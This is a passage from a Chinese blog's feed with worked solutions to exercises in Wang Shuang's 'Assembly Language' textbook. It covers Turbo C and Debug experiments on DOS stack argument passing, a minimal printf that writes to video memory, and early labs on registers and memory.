class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line">		<span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">s:		</div><div class="line"></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
<li><p>在C:\MINIC目录下，用TC.EXE将F.C重新进行编译，连接，生成F.EXE。这次能通过连接吗？F.EXE可以正确运行吗？用Debug察看F.EXE的汇编代码。<br> 能通过连接，可以正确运行，汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,076A</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">DS</span>,<span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SS</span>,<span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>,<span class="number">0080</span></div><div class="line"><span class="keyword">CALL</span> <span class="number">0012</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,4C00</div><div class="line"><span class="keyword">INT</span> <span class="number">21</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0690</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">61</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0691</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">02</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>在新的C0S.OBJ的基础上，写一个新的F.C，向安全的内存空间写入从“a”到“h”的8个字符，分析、理解F.C。<br>程序F.C：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Buffer ((char *) * (int far *)0x02000000)</span></div><div class="line"></div><div class="line">f()</div><div class="line">&#123;</div><div class="line">	Buffer = <span class="number">0</span>;</div><div class="line"></div><div class="line">	Buffer[<span class="number">10</span>] = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">while</span>(Buffer[<span class="number">10</span>]!=<span class="number">8</span>)</div><div class="line">	&#123;</div><div class="line">		Buffer[Buffer[<span class="number">10</span>]]=<span class="string">'a'</span>+Buffer[<span class="number">10</span>];</div><div class="line">		Buffer[<span class="number">10</span>]++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>汇编代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,076A</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">DS</span>,<span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SS</span>,<span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>,<span class="number">0080</span></div><div class="line"><span class="keyword">CALL</span> <span class="number">0012</span> <span class="comment">;调用f函数</span></div><div class="line"><span class="keyword">INT</span> <span class="number">21</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span> <span class="comment">;0012</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>],<span class="number">0000</span> <span class="comment">;设置Buffer=0，即将0200:0000处的内存单元改为0</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A],<span class="number">00</span> <span class="comment">;设置Buffer[10]=0 即将DS:000A处的内存单元改为0</span></div><div class="line"><span class="keyword">JMP</span> <span class="number">006D</span> <span class="comment">;while 循环条件判断</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span> <span class="comment">;0031</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BX</span>+0A] <span class="comment">;AL等于Buffer[10]，即将DS:000A内存字节单元的内容存入AL中</span></div><div class="line"><span class="keyword">ADD</span> <span class="built_in">AL</span>,<span class="number">61</span> <span class="comment">;为AL加上'a'</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BX</span>+0A] <span class="comment">;将Buffer[10]的值传入AL，即将DS:000A处的内存字节单元存入AL中</span></div><div class="line"><span class="keyword">CBW</span> <span class="comment">;将AL扩展至16位</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BX</span> <span class="comment">;取回BX</span></div><div class="line"><span class="keyword">ADD</span> <span class="built_in">BX</span>,<span class="built_in">AX</span> <span class="comment">;BX现在值为Buffer[10]</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">AX</span> <span class="comment">;取回AX</span></div><div class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;将所要设置的数值'a'+Buffer[10]存入Buffer[Buffer[10]]中</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>] <span class="comment">;将Buffer解引用，即将0200:0000处的内存字单元存入BX中</span></div><div class="line"><span class="keyword">INC</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A] <span class="comment">;将Buffer[10]自增</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0200</span> <span class="comment">;006D</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">XOR</span> <span class="built_in">BX</span>,<span class="built_in">BX</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,[<span class="built_in">BX</span>]</div><div class="line"><span class="keyword">CMP</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">BX</span>+0A],<span class="number">08</span> <span class="comment">;判断Buffer[10]是否等于8</span></div><div class="line"><span class="keyword">JNZ</span> <span class="number">0031</span> <span class="comment">;不等于则继续</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span> <span class="comment">;等于则返回</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="研究试验5-函数如何接受不定数量的参数"><a href="#研究试验5-函数如何接受不定数量的参数" class="headerlink" title="研究试验5 函数如何接受不定数量的参数"></a>研究试验5 函数如何接受不定数量的参数</h2><p>用C:\MINIC下的TC.EXE完成下面的试验。</p>
<ol>
<li><p>写一个程序A.C：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">char</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	showchar(<span class="string">'a'</span>, <span class="number">2</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">char</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>)=a;</div><div class="line"></div><div class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>)=b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 用TC.EXE对A.C进行编译，连接，生成A.EXE。用Debug加载A.EXE，对函数的汇编代码进行分析。解答这两个问题：main函数是如何给showchar传递参数的？showchar是如何接受参数的？<br> main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="number">0002</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,<span class="number">61</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">AX</span></div><div class="line"><span class="keyword">CALL</span> 020B <span class="comment">;调用showchar函数</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">CX</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">CX</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> showchar函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BP</span>+<span class="number">4</span>]</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0690</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;f函数的第1条语句</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AL</span>,[<span class="built_in">BP</span>+<span class="number">6</span>]</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,B800</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">ES</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0691</span></div><div class="line"><span class="symbol">ES:</span></div><div class="line"><span class="keyword">MOV</span> [<span class="built_in">BX</span>],<span class="built_in">AL</span> <span class="comment">;f函数的第2条语句</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> 答案：<br> main函数通过将对应的参数压栈来给showchar传递参数，并且在函数返回后通过POP操作将参数退栈。<br> showchar通过SS:BP以及寻址在栈中取得对应的参数。</p>
</li>
<li><p>写一个程序B.C：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>,...)</span></span>;</div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	showchar(<span class="number">8</span>,<span class="number">2</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'f'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">showchar</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> color,...)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> a;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(a=<span class="number">0</span>;a!=n;a++)</div><div class="line">	&#123;</div><div class="line">		*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>+a+a)=*(<span class="keyword">int</span> *)(_BP+<span class="number">8</span>+a+a);<span class="comment">//加8是因～为call的时候将CS、IP压栈</span></div><div class="line"></div><div class="line">		*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>+a+a)=color;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 分析程序B.C，深入理解相关的知识。<br> 思考：showchar函数是如何知道要显示多少个字符的？printf函数是如何知道有多少个参数的？<br> 待显示字符的个数为showchar函数的第一个参数，showchar函数以此得知要显示的字符的个数。<br> 通过对printf的一个参数所指向的字符串的分析，printf函数以此得知参数的个数。</p>
</li>
<li><p>实现一个简单的printf函数，只需支持“%c %d”即可。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *, ...)</span></span>;</div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	myprintf(<span class="string">"%d %c abc %%\n"</span>, <span class="number">-12345</span>, <span class="number">48</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> * str, ...)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> position = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span> (*str != <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (*str == <span class="number">37</span>)</div><div class="line">		&#123;</div><div class="line">			str++;</div><div class="line">			<span class="keyword">if</span> (*str == <span class="number">68</span> || *str == <span class="number">100</span>)</div><div class="line">			&#123;</div><div class="line">				<span class="keyword">int</span> index;</div><div class="line">				<span class="keyword">char</span> flag = <span class="number">0</span>;</div><div class="line">				<span class="keyword">int</span> length = <span class="number">0</span>;</div><div class="line">				<span class="keyword">int</span> num = *(<span class="keyword">int</span> *)(_BP + <span class="number">6</span> + count);</div><div class="line">				<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</div><div class="line">					flag = <span class="number">1</span>;</div><div class="line">					num *= <span class="number">-1</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">while</span> (num != <span class="number">0</span>)</div><div class="line">				&#123;</div><div class="line">					num = num / <span class="number">10</span>;</div><div class="line">					length++;</div><div class="line">				&#125;</div><div class="line">				num = *(<span class="keyword">int</span> *)(_BP + <span class="number">6</span> + count);</div><div class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>) num *= <span class="number">-1</span>;</div><div class="line">				position += length + flag - <span class="number">1</span>;</div><div class="line">				<span class="keyword">for</span> (index = <span class="number">0</span> ; index &lt; length; ++index)</div><div class="line">				&#123;</div><div class="line">					*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = num % <span class="number">10</span> + <span class="number">48</span>;</div><div class="line">					num = num / <span class="number">10</span>;</div><div class="line">					position--;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>)</div><div class="line">				&#123;</div><div class="line">					*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = <span class="string">'-'</span>;</div><div class="line">					position--;</div><div class="line">				&#125;</div><div class="line">				position += length + flag + <span class="number">1</span>;</div><div class="line">				count += <span class="number">2</span>;</div><div class="line">				str++;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (*str == <span class="number">67</span> || *str == <span class="number">99</span>)</div><div class="line">			&#123;</div><div class="line">				*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = *(<span class="keyword">char</span> *)(_BP + <span class="number">6</span> + count);</div><div class="line">				count++;</div><div class="line">				position++;</div><div class="line">				str++;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = <span class="string">'%'</span>;</div><div class="line">				position++;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123;</div><div class="line">			*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span> + <span class="number">1600</span> + position * <span class="number">2</span>) = *str;</div><div class="line">			position++;</div><div class="line">			str++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第三部分也是最后一部分（大概），主要是书后的综合研究&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;研究试验1-搭建一个精简的C语言开发环境&quot;&gt;&lt;a href=&quot;#研究试验
    
    </summary>
    
      <category term="汇编" scheme="http://blog.codedragon.tech/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="http://blog.codedragon.tech/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="综合研究" scheme="http://blog.codedragon.tech/tags/%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>王爽汇编语言第三版实验</title>
    <link href="http://blog.codedragon.tech/2017/03/09/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%89%88%E5%AE%9E%E9%AA%8C/"/>
    <id>http://blog.codedragon.tech/2017/03/09/王爽汇编语言第三版实验/</id>
    <published>2017-03-09T03:42:37.000Z</published>
    <updated>2017-04-07T11:45:39.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第二部分，包括了书本上的实验</p>
</blockquote>
<h2 id="实验1-查看CPU和内存，用机器指令和汇编指令编程"><a href="#实验1-查看CPU和内存，用机器指令和汇编指令编程" class="headerlink" title="实验1 查看CPU和内存，用机器指令和汇编指令编程"></a>实验1 查看CPU和内存，用机器指令和汇编指令编程</h2><ol>
<li><p>使用Debug，将下面的程序段写入内存，逐条执行，观察每条指令执行后，CPU中相关寄存器的变化。<br><table><thead><tr><th style="text-align: center">机器码</th><th style="text-align: center">汇编指令</th><th style="text-align: center">执行后相关寄存器变化</th></tr></thead><tbody><tr><td style="text-align: center">b8 20 4e</td><td style="text-align: center">mov ax, 4E20H</td><td style="text-align: center">AX=4E20H</td></tr><tr><td style="text-align: center">05 16 14</td><td style="text-align: center">add ax, 1416H</td><td style="text-align: center">AX=6236H</td></tr><tr><td style="text-align: center">bb 00 20</td><td style="text-align: center">mov bx, 2000H</td><td style="text-align: center">BX=2000H</td></tr><tr><td style="text-align: center">01 d8</td><td style="text-align: center">add ax, bx</td><td style="text-align: center">AX=8236H</td></tr><tr><td style="text-align: center">89 c3</td><td style="text-align: center">mov bx, ax</td><td style="text-align: center">BX=8236H</td></tr><tr><td style="text-align: center">01 d8</td><td style="text-align: center">add ax, bx</td><td style="text-align: center">AX=046CH</td></tr><tr><td style="text-align: center">b8 1a 00</td><td style="text-align: center">mov ax, 001AH</td><td style="text-align: center">AX=001AH</td></tr><tr><td style="text-align: center">bb 26 00</td><td style="text-align: center">mov bx, 0026H</td><td style="text-align: center">BX=0026H</td></tr><tr><td style="text-align: center">00 d8</td><td style="text-align: center">add al, bl</td><td style="text-align: center">AX=0040H</td></tr><tr><td style="text-align: center">00 dc</td><td style="text-align: center">add ah, bl</td><td style="text-align: center">AX=2640H</td></tr><tr><td style="text-align: center">00 c7</td><td style="text-align: center">add bh, al</td><td style="text-align: center">BX=4026H</td></tr><tr><td style="text-align: center">b4 00</td><td style="text-align: center">mov ah, 0</td><td style="text-align: center">AX=0040H</td></tr><tr><td style="text-align: center">00 d8</td><td style="text-align: center">add al, bl</td><td style="text-align: center">AX=0066H</td></tr><tr><td style="text-align: center">04 9c</td><td style="text-align: center">add al, 9CH</td><td style="text-align: center">AX=0002H</td></tr></tbody></table><br>提示，可用E命令和A命令以两种方式将指令写入内存。注意用T命令执行时，CS:IP的指向。</p>
</li>
<li><p>将下面3条指令写入从2000:0开始的内存单元中，利用这3条指令计算2的8次方。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">1</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">jmp</span> <span class="number">2000</span>:<span class="number">0003</span></div></pre></td></tr></table></figure>
<p>每次执行 add ax, ax 相当于将ax乘2，重复执行该条指令8次即可。</p>
</li>
<li><p>查看内存中的内容。<br>PC机主板上的ROM写有一个生产日期，在内存FFF00H～FFFFFH的某几个单元中，请找到这个生产日期并试图改变它。<br>提示，如果读者对实验的结果感到疑惑，请仔细阅读第1章中的1.15节。</p>
</li>
</ol>
<p>通过Debug中的D命令，可以观察到生产日期以MM/DD/YY的格式存储在内存的ffff:0005-ffff:000c共计8个字节处。<br>该生产日期不可被修改，因为其只读。</p>
<ol>
<li>向内存从B8100H开始的单元中填写数据，如：<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-e B810:<span class="number">0000</span> <span class="number">01</span> <span class="number">01</span> <span class="number">02</span> <span class="number">02</span> <span class="number">03</span> <span class="number">03</span> <span class="number">04</span> <span class="number">04</span></div></pre></td></tr></table></figure>
请读者先填写不同的数据，观察产生的现象；再改变填写的地址，观察产生的现象。<br>提示，如果读者对实验的结果感到疑惑，请仔细阅读第1章中的1.15节。</li>
</ol>
<p>通过向内存中的显存地址空间写入数据，控制在屏幕上的不同位置显示不同颜色的字符。</p>
<h2 id="实验2-用机器指令和汇编指令编程"><a href="#实验2-用机器指令和汇编指令编程" class="headerlink" title="实验2 用机器指令和汇编指令编程"></a>实验2 用机器指令和汇编指令编程</h2><ol>
<li><p>使用Debug，将下面的程序段写入内存，逐条执行，根据指令执行后的实验运行情况填空。</p>
